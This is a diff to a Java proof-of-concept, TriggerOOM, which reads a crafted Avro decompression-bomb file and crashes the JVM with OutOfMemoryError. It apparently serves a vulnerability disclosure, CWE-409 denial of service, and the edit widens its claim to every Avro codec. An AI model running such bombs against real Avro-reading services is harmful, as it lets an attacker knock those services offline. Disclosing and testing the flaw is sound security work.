@@ -11,8 +11,8 @@ import java.io.File;
  *
  * When pointed at a decompression-bomb file (created by CreatePoC or
  * CraftBomb) and run with a constrained heap (e.g. -Xmx32m), this triggers
- * OutOfMemoryError inside DeflateCodec.decompress() because the codec
- * decompresses into an unbounded ByteArrayOutputStream.
+ * OutOfMemoryError inside the codec's decompress() method because every
+ * Avro codec decompresses into an unbounded ByteArrayOutputStream.
  *
  * Exit codes:
  *   0  -- all records read without error (heap was large enough)
@@ -44,8 +44,9 @@ public class TriggerOOM {
                 new DataFileReader<>(f, new GenericDatumReader<>())) {
 
             // Show schema so the user can see it looks realistic
+            String codec = reader.getMetaString("avro.codec");
             System.out.println("Schema: " + reader.getSchema().getFullName());
-            System.out.println("Codec:  " + reader.getMetaString("avro.codec"));
+            System.out.println("Codec:  " + codec);
             System.out.println();
             System.out.println("Reading records...");
             System.out.println();
@@ -74,9 +75,11 @@ public class TriggerOOM {
             System.err.println("Stack trace:");
             e.printStackTrace(System.err);
             System.err.println();
-            System.err.println("Root cause: DeflateCodec.decompress() decompresses into an");
-            System.err.println("unbounded ByteArrayOutputStream with no size limit, allowing");
+            System.err.println("Root cause: The Avro codec's decompress() method decompresses into");
+            System.err.println("an unbounded ByteArrayOutputStream with no size limit, allowing");
             System.err.println("a small compressed payload to expand until OOM.");
+            System.err.println();
+            System.err.println("ALL codecs are affected: Deflate, Zstandard, BZip2, Snappy, XZ.");
             System.err.println();
             System.err.println("CWE-409: Improper Handling of Highly Compressed Data");
             System.err.println("Impact: Denial of Service (DoS) - JVM crash via OOM");
